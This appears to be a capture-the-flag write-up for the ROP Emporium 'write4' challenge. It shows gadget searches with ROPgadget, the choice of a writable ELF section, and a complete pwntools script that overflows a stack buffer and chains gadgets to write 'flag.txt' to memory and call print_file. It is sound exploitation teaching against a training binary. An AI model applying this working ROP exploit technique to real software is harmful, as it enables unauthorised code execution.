# write4

_must I do_ everything _around here?_

This challenge takes the standard ROP chain to a whole 'nother level. We now have to write our own string to memory, as the conveniently placed `usefulString` is no longer provided for us.

Instead of a call to `system("cat flag.txt")`, a `print_file()` function is provided in a shared library that came with the executable. As the author puts it:

> A PLT entry for a function named `print_file()` exists within the challenge binary, simply call it with the name of a file you wish to read (like "flag.txt") as the 1st argument.

Alright, so we know that we have to somehow get a string into memory from our stack, and get `rdi` to point to it. We could simply keep it on the stack and get `rdi` to point to it, but computing its stack address would require leaking `rsp` or `rbp`, and that's just too complicated for this. Instead, we have to write it somewhere in virtual memory.

Let's pop open Cutter and see what we've got to work with.

```text
sym.imp.pwnme
sym.imp.print_file
sym.usefulFunction
sym.main
```

Right away we see that `pwnme` is imported from the shared object binary (which is not surprising, as it was mentioned in the challenge). This isn't an issue, as the stack is always in the same place. Also, `usefulFunction` isn't particularly useful, it just ensures `print_file()` is imported and placed in the PLT.

As mentioned earlier, we have to find a way to write to virtual memory. We can do this by checking the permissions of each ELF section with a well placed `rizin` command:

```text
[0x00400617]> iS
paddr      size  vaddr      vsize align perm name               type       flags         
-----------------------------------------------------------------------------------------
0x00000000 0x0   0x00000000 0x0   0x0   ----                    NULL       
0x00000238 0x1c  0x00400238 0x1c  0x0   -r-- .interp            PROGBITS   alloc
0x00000254 0x20  0x00400254 0x20  0x0   -r-- .note.ABI-tag      NOTE       alloc
0x00000274 0x24  0x00400274 0x24  0x0   -r-- .note.gnu.build-id NOTE       alloc
0x00000298 0x38  0x00400298 0x38  0x0   -r-- .gnu.hash          GNU_HASH   alloc
0x000002d0 0xf0  0x004002d0 0xf0  0x0   -r-- .dynsym            DYNSYM     alloc
0x000003c0 0x7c  0x004003c0 0x7c  0x0   -r-- .dynstr            STRTAB     alloc
0x0000043c 0x14  0x0040043c 0x14  0x0   -r-- .gnu.version       VERSYM     alloc
0x00000450 0x20  0x00400450 0x20  0x0   -r-- .gnu.version_r     VERNEED    alloc
0x00000470 0x30  0x00400470 0x30  0x0   -r-- .rela.dyn          RELA       alloc
0x000004a0 0x30  0x004004a0 0x30  0x0   -r-- .rela.plt          RELA       alloc,info
0x000004d0 0x17  0x004004d0 0x17  0x0   -r-x .init              PROGBITS   alloc,execute
0x000004f0 0x30  0x004004f0 0x30  0x0   -r-x .plt               PROGBITS   alloc,execute
0x00000520 0x182 0x00400520 0x182 0x0   -r-x .text              PROGBITS   alloc,execute
0x000006a4 0x9   0x004006a4 0x9   0x0   -r-x .fini              PROGBITS   alloc,execute
0x000006b0 0x10  0x004006b0 0x10  0x0   -r-- .rodata            PROGBITS   alloc
0x000006c0 0x44  0x004006c0 0x44  0x0   -r-- .eh_frame_hdr      PROGBITS   alloc
0x00000708 0x120 0x00400708 0x120 0x0   -r-- .eh_frame          PROGBITS   alloc
0x00000df0 0x8   0x00600df0 0x8   0x0   -rw- .init_array        INIT_ARRAY write,alloc
0x00000df8 0x8   0x00600df8 0x8   0x0   -rw- .fini_array        FINI_ARRAY write,alloc
0x00000e00 0x1f0 0x00600e00 0x1f0 0x0   -rw- .dynamic           DYNAMIC    write,alloc
0x00000ff0 0x10  0x00600ff0 0x10  0x0   -rw- .got               PROGBITS   write,alloc
0x00001000 0x28  0x00601000 0x28  0x0   -rw- .got.plt           PROGBITS   write,alloc
0x00001028 0x10  0x00601028 0x10  0x0   -rw- .data              PROGBITS   write,alloc
0x00001038 0x0   0x00601038 0x8   0x0   -rw- .bss               NOBITS     write,alloc
0x00001038 0x29  0x00000000 0x29  0x0   ---- .comment           PROGBITS   merge,strings
0x00001068 0x618 0x00000000 0x618 0x0   ---- .symtab            SYMTAB     
0x00001680 0x1f6 0x00000000 0x1f6 0x0   ---- .strtab            STRTAB     
0x00001876 0x103 0x00000000 0x103 0x0   ---- .shstrtab          STRTAB      
```

We're looking for sections that have read and write permissions, so that narrows it down to these few:

```text
perm name               type       flags         
----------------------------------------------
-rw- .init_array        INIT_ARRAY write,alloc
-rw- .fini_array        FINI_ARRAY write,alloc
-rw- .dynamic           DYNAMIC    write,alloc
-rw- .got               PROGBITS   write,alloc
-rw- .got.plt           PROGBITS   write,alloc
-rw- .data              PROGBITS   write,alloc
-rw- .bss               NOBITS     write,alloc
```

We could write to any of these sections. `.bss` is out, as it takes up no space. `.init` and `.fini` arrays are for calling constructors and destructors, and I'd rather not trifle with them. `.dynamic` is for some ELF dynamic linker wizardry, and I'd also rather not touch it. That just leaves the GOT, its PLT section, and `.data`. We could write to the GOT (_not_ the PLT section), but I'm choosing to write to `.data` this time.

So, we know that ROP-ing is basically stack smashing to achieve arbitrary code execution. This means with a well-picked gadget, we can write something to memory. This is usually done with a gadget containing a `mov` instruction (duh). We can run `ROPgadget` to search for such a gadget. We don't really need to specify any registers, so we'll do a broad search with just `mov` for now.

```text
$ ROPgadget --binary ./write4 | grep "mov"

0x00000000004005fc : add byte ptr [rax], al ; add byte ptr [rax], al ; push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x400590
0x00000000004005fd : add byte ptr [rax], al ; add byte ptr [rbp + 0x48], dl ; mov ebp, esp ; pop rbp ; jmp 0x400590
0x00000000004005fe : add byte ptr [rax], al ; push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x400590
0x00000000004005ff : add byte ptr [rbp + 0x48], dl ; mov ebp, esp ; pop rbp ; jmp 0x400590
0x000000000040061a : in eax, 0xbf ; mov ah, 6 ; add al, bpl ; jmp 0x400621
0x0000000000400579 : je 0x400588 ; pop rbp ; mov edi, 0x601038 ; jmp rax
0x00000000004005bb : je 0x4005c8 ; pop rbp ; mov edi, 0x601038 ; jmp rax
0x000000000040061c : mov ah, 6 ; add al, bpl ; jmp 0x400621
0x00000000004005e2 : mov byte ptr [rip + 0x200a4f], 1 ; pop rbp ; ret
0x0000000000400629 : mov dword ptr [rsi], edi ; ret
0x0000000000400610 : mov eax, 0 ; pop rbp ; ret
0x0000000000400602 : mov ebp, esp ; pop rbp ; jmp 0x400590
0x000000000040057c : mov edi, 0x601038 ; jmp rax
0x0000000000400628 : mov qword ptr [r14], r15 ; ret
0x0000000000400601 : mov rbp, rsp ; pop rbp ; jmp 0x400590
0x000000000040057b : pop rbp ; mov edi, 0x601038 ; jmp rax
0x0000000000400600 : push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x400590
```

Very quickly we can zero on in this gadget:

```text
0x0000000000400628 : mov qword ptr [r14], r15 ; ret
```

This moves the entire contents of the `r15` register to the address pointed to by `r14`.

Perfect. Now we just need a way to get our string into `r15` and the address of `.data` into `r14`. Since we control the stack, we know from the previous challenges that we can move stack values into registers with the `pop` instruction.

We can do another `ROPgadget` search, filtering for `r14` and for `pop` in two passes:

```text
$ ROPgadget --binary ./write4 | grep "r14" | grep "pop"

0x000000000040068c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040068e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400690 : pop r14 ; pop r15 ; ret
0x000000000040068b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040068f : pop rbp ; pop r14 ; pop r15 ; ret
0x000000000040068d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
```

And there's the gadget we're looking for.

```text
0x0000000000400690 : pop r14 ; pop r15 ; ret
```

One last thing. We need to call `print_file` at the end of it all to get our flag, and we have to pass it our string. As I mentioned earlier, this means getting `rdi` to point to the `.data` section, where our string is located. This means one last `ROPgadget` search:

```text
$ ROPgadget --binary ./write4 | grep "pop rdi"

0x0000000000400693 : pop rdi ; ret
```

Excellent.

Alright, let's put our entire exploit together.

1. We overflow the stack and overwrite it with our crafted data. This is crafted in such a way that when `pwnme` returns, it:
2. Jumps to the gadget that pops the top two values (the address of `.data` and the string) off the stack and into `r14` and `r15`.
3. When that gadget returns, it jumps to the gadget that moves the value of `r15` into the address pointed to by `r14`.
4. When that gadget returns, it jumps to the gadget that pops the address of `.data` off the stack and into `rdi`.
5. Lastly, we can return and finally jump to `print_file` via its PLT entry.

Here's that in assembly, because I can:

```assembly
; ret instructions removed for clarity
pop r14 ; pop the address of .data into r14
pop r15 ; pop the string into r15
mov qword ptr [r14], r15 ; move the data in r15 into .data
pop rdi ; pop the address of .data into rdi
; return to print_file at this point
```

And all it takes to do this is a simple Python script:

```python
from pwn import *

context.arch = "amd64"

elf = context.binary = ELF("./write4")

# address of our data section; store this in r14
DATA_PTR = p64(0x601028)
# address of PLT entry for print_file
PRINTFILE = p64(elf.symbols.print_file)
# file to read; store this in r15
FLAG_PATH = b'flag.txt'

# our gadgets.

# mov qword ptr [r14], r15; ret
MOV_DATA_GADGET = p64(0x400628)
# pop r14; pop r15; ret
POP_R14_R15_GADGET = p64(0x400690)
# pop rdi; ret
POP_RDI_GADGET = p64(0x400693)

# overflow the buffer
payload = b'A' * 40

# set up for jump to pop r14, then r15
payload += POP_R14_R15_GADGET
# first pop r14
payload += DATA_PTR
# then pop r15
payload += FLAG_PATH
# ret to move data
payload += MOV_DATA_GADGET
# ret to pop rdi
payload += POP_RDI_GADGET
# pop address of data into rdi
payload += DATA_PTR
# ret to print_file
payload += PRINTFILE

conn = process("./write4")
conn.recvuntil(b'> ')
conn.send(payload)

recved = conn.recvall()
print(recved.decode("ascii"))
```

It's important to note that the string `flag.txt` is exactly 8 ACSII characters long, hence it is only eight bytes and can fit perfectly into a 64-bit register. If the name was any longer, we would have to break the string into 8-byte segments and call the `mov` gadget two or more times, each time writing to an offset from `.data`.

With that out of the way, it's time for profit.

```text
$ python exploit.py

[*] '/home/sammy/Projects/binexp/ropemporium/4-write4/write4'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[+] Starting local process './write4': pid 61452
[+] Receiving all data: Done (44B)
[*] Process './write4' stopped with exit code -11 (SIGSEGV) (pid 61452)
Thank you!
ROPE{a_placeholder_32byte_flag!}
```
